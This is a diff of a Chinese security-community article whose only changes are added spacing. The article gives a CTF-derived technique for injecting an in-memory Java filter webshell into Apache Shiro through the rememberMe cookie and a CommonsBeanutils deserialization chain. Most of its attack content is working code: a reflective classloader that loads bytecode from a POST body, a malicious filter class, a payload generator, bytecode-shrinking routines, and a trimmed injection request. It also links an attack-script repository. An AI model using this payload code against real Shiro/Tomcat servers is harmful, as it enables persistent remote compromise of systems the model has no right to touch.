@@ -1,5 +1,5 @@
 ---
-title: 简化请求头向shiro注入内存马 - 先知社区
+title: 简化请求头向 shiro 注入内存马 - 先知社区
 url: https://xz.aliyun.com/t/14107?u_atoken=e0818f2f7432b278ffb397f46ee71c26&u_asession=01fESOiiSCU6fGGXCWQAEOsTE_V9nnKRCt-fVUs1wbkethrbVX9EL6980rMwcZZfqEdlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05B-uoIyTXGcS7V7wYep9ifmv04DgJGjnb4qXvnMDk0_tiPavvfq5B1YvFEg1H9aKaeVrTVPZY6TxYKq7BOYnJ1h7wcZ3eVHtViBekP1UxZ_qKfHXyCPKyUAAd-ffvidMvHjFvsB7n8mMga_P9hr7PY3A3y4Q4LNSSDd1wKoupcnBg2QMxYs6lyXb1lFWKql562fOGgcaqXXvta7UQ1yfGvA4Re7i-4TJvr8PVS_CjAY3IpsvkY4X8VMaLZgUS1hw2bYEYcPdzMnFIjHM1mQVGjbYDPqDaqHF-8_fXhRt71wF6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=VmBr%2BlY5drkzNJDZ0F8f1Q3TTS8%3D
 clipped_at: 2024-03-21 11:49:26
 category: default
@@ -8,35 +8,35 @@ tags:
 ---
 
 
-# 简化请求头向shiro注入内存马 - 先知社区
+# 简化请求头向 shiro 注入内存马 - 先知社区
 
 #### 前言
 
-该思路源自rwctf2024体验赛oldshiro，在原题当中wp使用了javassist生成字节码的方式最终读取到了给出docker环境中的flag，由于在比赛的时候docker环境作为比赛的hint放出了，当中flag的位置是已知的。这就导致我们不必使用回显内存马这种权限维持的方法，直接采用文件读取的方式就可以获得flag。所以就引发了一个思考，如果我们将wp当中的手段放在内存马注入上面，究竟能够将注入内存马的http请求头缩短至多少呢？（ps：这个思路事实上也是我在HSCCTF2024当中的出题思路，但是由于各种原因当时的题目出烂了，不仅“不出网”的设置没搞好，而且http的maxheader也设置的过于宽松了）
+该思路源自 rwctf2024 体验赛 oldshiro，在原题当中 wp 使用了 javassist 生成字节码的方式最终读取到了给出 docker 环境中的 flag，由于在比赛的时候 docker 环境作为比赛的 hint 放出了，当中 flag 的位置是已知的。这就导致我们不必使用回显内存马这种权限维持的方法，直接采用文件读取的方式就可以获得 flag。所以就引发了一个思考，如果我们将 wp 当中的手段放在内存马注入上面，究竟能够将注入内存马的 http 请求头缩短至多少呢？（ps：这个思路事实上也是我在 HSCCTF2024 当中的出题思路，但是由于各种原因当时的题目出烂了，不仅“不出网”的设置没搞好，而且 http 的 maxheader 也设置的过于宽松了）
 
 #### 实验环境
 
 [实验环境及攻击脚本](https://github.com/XA-hey/shortshiromemshell)
 
-#### POST方式注入内存马
+#### POST 方式注入内存马
 
-在最一开始的时候，为什么需要对内存马注入payload的大小作出改变呢？在正常的tomcat当中其默认的最大请求头大小(maxheader)就不足以承载整个内存马代码，引发了后续的各种绕过maxheader限制的方式。在当前的市面上有着三种方式
+在最一开始的时候，为什么需要对内存马注入 payload 的大小作出改变呢？在正常的 tomcat 当中其默认的最大请求头大小 (maxheader) 就不足以承载整个内存马代码，引发了后续的各种绕过 maxheader 限制的方式。在当前的市面上有着三种方式
 
 ```plain
-1.通过反射修改maxhttpheadersize
-2.将class bytes使用gzip+base64压缩编码
-3.从POST请求体中发送字节码数据
+1.通过反射修改 maxhttpheadersize
+2.将 class bytes 使用 gzip+base64 压缩编码
+3.从 POST 请求体中发送字节码数据
 ```
 
 为了契合这篇文章的主题，我们这里选择第三种方式作为内存马的注入方式。虽然这个注入方式并不是本文介绍的主题但还是要少尉讲解一下其中的内容。
 
-post方法注入内存马方法的本质是通过动态类加载的方式，实现内存马注入。动态类加载在CC6链子学习的时候就已经有所了解，不管是本地的加载字节码，还是远程加载的字节码，都会经历三个阶段:`ClassLoader#loadClass->ClassLoader#findClass->ClassLoader#defineClass`，defineClass的作用是处理传入的字节码，将其处理成真正的Java类。所以到这里思路其实就有了，使用动态类加载的方式加载内存马的字节流，将其转换成真正的内存马对象最后实现注入。内存马的字节流对象放在post请求中的body里面，让实现了动态类加载的类去body里面获取。为此我们需要去写一个能够动态类加载的Classloader。
+post 方法注入内存马方法的本质是通过动态类加载的方式，实现内存马注入。动态类加载在 CC6 链子学习的时候就已经有所了解，不管是本地的加载字节码，还是远程加载的字节码，都会经历三个阶段：`ClassLoader#loadClass->ClassLoader#findClass->ClassLoader#defineClass`，defineClass 的作用是处理传入的字节码，将其处理成真正的 Java 类。所以到这里思路其实就有了，使用动态类加载的方式加载内存马的字节流，将其转换成真正的内存马对象最后实现注入。内存马的字节流对象放在 post 请求中的 body 里面，让实现了动态类加载的类去 body 里面获取。为此我们需要去写一个能够动态类加载的 Classloader。
 
-##### Myclassloader的实现
+##### Myclassloader 的实现
 
-Myclassloader要实现两个功能：1.从post的请求体当中获取内存马的字节流对象，2.动态加载内存马对象。
+Myclassloader 要实现两个功能：1.从 post 的请求体当中获取内存马的字节流对象，2.动态加载内存马对象。
 
-首先是从post的请求体当中获取内存马的字节流对象，毫无疑问我们需要request对象，在这一步中我们可以参考之前在内存马当中所写的获取request对象的过程。
+首先是从 post 的请求体当中获取内存马的字节流对象，毫无疑问我们需要 request 对象，在这一步中我们可以参考之前在内存马当中所写的获取 request 对象的过程。
 
 ```plain
 javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
@@ -44,7 +44,7 @@ Field r = request.getClass().getDeclaredField("request");
 r.setAccessible(true);
 ```
 
-动态加载方法，我们可以通过反射的方式从ClassLoader里面获取defineclass函数用来加载我们从post当中获取的内存马字节流
+动态加载方法，我们可以通过反射的方式从 ClassLoader 里面获取 defineclass 函数用来加载我们从 post 当中获取的内存马字节流
 
 ```plain
 java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
@@ -52,7 +52,7 @@ defineClassMethod.setAccessible(true);
 Class cc = (Class) defineClassMethod.invoke(new ClassLoader(){}, classBytes, 0, classBytes.length);
 ```
 
-二者结合一下我们最终得到了MyClassLoader的最终实现。
+二者结合一下我们最终得到了 MyClassLoader 的最终实现。
 
 ```plain
 public class MyClassLoader extends AbstractTranslet {
@@ -61,10 +61,10 @@ public class MyClassLoader extends AbstractTranslet {
             javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
             Field r = request.getClass().getDeclaredField("request");
             r.setAccessible(true);
-            //从post请求体里面拿到内存马的base64字符串
+            //从 post 请求体里面拿到内存马的 base64 字符串
             String classData=request.getParameter("classData");
             System.out.println(classData+"\n");
-            //解码内存马的base64字符串，得到内存马的字节流
+            //解码内存马的 base64 字符串，得到内存马的字节流
             byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
             //动态类加载内存马
             java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
@@ -92,7 +92,7 @@ public class MyClassLoader extends AbstractTranslet {
 
 ##### 内存马准备
 
-内存马的话就随便找一个能用就行，这里以filter内存马为例，事实上其他的也可以interceptor等等。
+内存马的话就随便找一个能用就行，这里以 filter 内存马为例，事实上其他的也可以 interceptor 等等。
 
 ```plain
 public class EvilFilter extends AbstractTranslet implements Filter{
@@ -186,15 +186,15 @@ public class Base64Client {
 }
 ```
 
-这里需要注意一点，经过实测classData当中的内存马字节流的base64编码字符串还要进行url编码才能正常运作
+这里需要注意一点，经过实测 classData 当中的内存马字节流的 base64 编码字符串还要进行 url 编码才能正常运作
 
-效果如下（使用CB链装载MyclassLoader，放在rememberme当中。使用市面上常用的关于shiro攻击的rememberme加密脚本即可）
+效果如下（使用 CB 链装载 MyclassLoader，放在 rememberme 当中。使用市面上常用的关于 shiro 攻击的 rememberme 加密脚本即可）
 
 [![](assets/1710992966-d6de1eae0fdb34fbb005a03783d92e07.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240315152727-79baa77c-e29d-1.png)
 
 #### 如何简化请求头
 
-在rwctf wp当中所给出的两个参考文章
+在 rwctf wp 当中所给出的两个参考文章
 
 [https://mp.weixin.qq.com/s?\_\_biz=Mzk0MTIzNTgzMQ==&mid=2247489588&idx=1&sn=0aa89b8828dc3e058ddbef69e2980790&chksm=c2d4d32cf5a35a3a54d164198cf7a29bea915a8c0e00d76d47231090cec35630f393ecd5d89d&scene=21](https://mp.weixin.qq.com/s?__biz=Mzk0MTIzNTgzMQ==&mid=2247489588&idx=1&sn=0aa89b8828dc3e058ddbef69e2980790&chksm=c2d4d32cf5a35a3a54d164198cf7a29bea915a8c0e00d76d47231090cec35630f393ecd5d89d&scene=21#wechat_redirect)
 
@@ -202,13 +202,13 @@ public class Base64Client {
 
 其中的参考文章主要的内容是三种缩减的方式（除分片传输以外）。
 
-第一种，是通过减少payload本身字符串当中的一些内容，将涉及到字符串的部分都压缩到最少。
+第一种，是通过减少 payload 本身字符串当中的一些内容，将涉及到字符串的部分都压缩到最少。
 
-第二种使用javassist动态生成字节码，将需要使用的代码段放在字符串对象当中，然后使用javassist动态创建一个类。
+第二种使用 javassist 动态生成字节码，将需要使用的代码段放在字符串对象当中，然后使用 javassist 动态创建一个类。
 
-第三种使用ASM删除LINENUMBER指令。
+第三种使用 ASM 删除 LINENUMBER 指令。
 
-针对第一种手段我们能够改变逻辑的部分在于CB链payload的生成代码以及MyClassLoader的异常处理部分，就像参考文章当中给出的我们可以减少TemplatesImpl当中的`_name`字段的值，以及整个`_factory`字段。最终CB链的payload如下
+针对第一种手段我们能够改变逻辑的部分在于 CB 链 payload 的生成代码以及 MyClassLoader 的异常处理部分，就像参考文章当中给出的我们可以减少 TemplatesImpl 当中的`_name`字段的值，以及整个`_factory`字段。最终 CB 链的 payload 如下
 
 ```plain
 public class CommonsBeanutils1Shiro {
@@ -242,7 +242,7 @@ public class CommonsBeanutils1Shiro {
 }
 ```
 
-MyClassLoader的代码如下（仅仅改了异常处理，将异常处理设为忽略）：
+MyClassLoader 的代码如下（仅仅改了异常处理，将异常处理设为忽略）：
 
 ```plain
 public class MyClassLoader extends AbstractTranslet {
@@ -273,7 +273,7 @@ public class MyClassLoader extends AbstractTranslet {
 }
 ```
 
-针对于上述的剩下两种种手段，其实在这种应用场景之下能够使用的是第三种，由于Myclassloader本身逻辑的复杂性，我们无法使用javassist动态生成出来，比如我们使用如下的代码段企图生成Myclassloader类
+针对于上述的剩下两种种手段，其实在这种应用场景之下能够使用的是第三种，由于 Myclassloader 本身逻辑的复杂性，我们无法使用 javassist 动态生成出来，比如我们使用如下的代码段企图生成 Myclassloader 类
 
 ```plain
 public static void main(String[] args) throws Exception {
@@ -302,9 +302,9 @@ public static void main(String[] args) throws Exception {
     }
 ```
 
-由于上述setBody当中有defineClassMethod.invoke字段，而defineClassMethod他是java.lang.reflect.Method对象，它使用invoke触发方法的时候会引发`invoke(java.lang.ClassLoader,byte[],int,int) not found in java.lang.reflect.Method`错误，没有正确的将defineClassMethod识别成defineclass。因此这种手段就可以排除掉了。
+由于上述 setBody 当中有 defineClassMethod.invoke 字段，而 defineClassMethod 他是 java.lang.reflect.Method 对象，它使用 invoke 触发方法的时候会引发`invoke(java.lang.ClassLoader,byte[],int,int) not found in java.lang.reflect.Method`错误，没有正确的将 defineClassMethod 识别成 defineclass。因此这种手段就可以排除掉了。
 
-所以，我们就仅剩下当前使用ASM删除LINENUMBER指令的方法了，我们只需要将参考文章里面的内容拿过来即可，也就是下面的三个函数。
+所以，我们就仅剩下当前使用 ASM 删除 LINENUMBER 指令的方法了，我们只需要将参考文章里面的内容拿过来即可，也就是下面的三个函数。
 
 ```plain
 public static byte[] shortenClassBytes(byte[] classBytes) {
@@ -340,7 +340,7 @@ public static byte[] shortenClassBytes(byte[] classBytes) {
     }
 ```
 
-在处理完这些东西之后，基本上就已经结束了，在参考文章当中曾提到有两个函数是必要的，也就是因为继承AbstractTranslet带来的两个transform方法。这两个transform方法没有只是会通不过编译器的编译而已，但是并不意味着代码没有办法正常运行。所以可以使用javassist操控字节码的特性对目标方法进行删除。
+在处理完这些东西之后，基本上就已经结束了，在参考文章当中曾提到有两个函数是必要的，也就是因为继承 AbstractTranslet 带来的两个 transform 方法。这两个 transform 方法没有只是会通不过编译器的编译而已，但是并不意味着代码没有办法正常运行。所以可以使用 javassist 操控字节码的特性对目标方法进行删除。
 
 ```plain
 ClassPool classPool = ClassPool.getDefault();
@@ -349,7 +349,7 @@ CtMethod ctMethod = clazz.getDeclaredMethod("transform");
 clazz.removeMethod(ctMethod);
 ```
 
-最终得到如下的payload生成代码
+最终得到如下的 payload 生成代码
 
 ```plain
 public class Client1 {
@@ -405,16 +405,16 @@ public class Client1 {
 }
 ```
 
-最终能够得到cookie的长度为，这个长度相较于之前已经足够小了。
+最终能够得到 cookie 的长度为，这个长度相较于之前已经足够小了。
 
 [![](assets/1710992966-e381e1361d9fe5dee599ad88a2ff4f37.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240315152755-8a64b4fa-e29d-1.png)
 
-但是我们在这里既然要提到关于请求头的缩小，简化请求头注入内存马，而服务器过滤的原则是针对于整个请求头。对于cookie的简化我们也许已经到了相当简化的地步了，可是原有的请求头数据就没有冗余吗？答案是肯定有。所以就有了下面的测试。经过多次删除请求头可以测试出如下的数据包头
+但是我们在这里既然要提到关于请求头的缩小，简化请求头注入内存马，而服务器过滤的原则是针对于整个请求头。对于 cookie 的简化我们也许已经到了相当简化的地步了，可是原有的请求头数据就没有冗余吗？答案是肯定有。所以就有了下面的测试。经过多次删除请求头可以测试出如下的数据包头
 
 ```plain
 POST /doLogin HTTP/1.1
 Host: 127.0.0.1:8080
-Cookie: rememberMe=(MyclassLoader的payload)
+Cookie: rememberMe=(MyclassLoader 的 payload)
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 25623
 ```
@@ -425,7 +425,7 @@ Content-Length: 25623
 
 [![](assets/1710992966-d27b468cc9ead2fcd7ebf944e5b69049.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240315152818-985e39e6-e29d-1.png)
 
-其最终可以将http头大小限制在3600左右。
+其最终可以将 http 头大小限制在 3600 左右。
 
 [![](assets/1710992966-2c53d65249b535bd03d78657b94fc3e7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240315152831-9f97874e-e29d-1.png)
 
@@ -435,4 +435,4 @@ Content-Length: 25623
 
 [https://xz.aliyun.com/t/6227](https://xz.aliyun.com/t/6227)
 
-rwctf体验赛2024
+rwctf 体验赛 2024
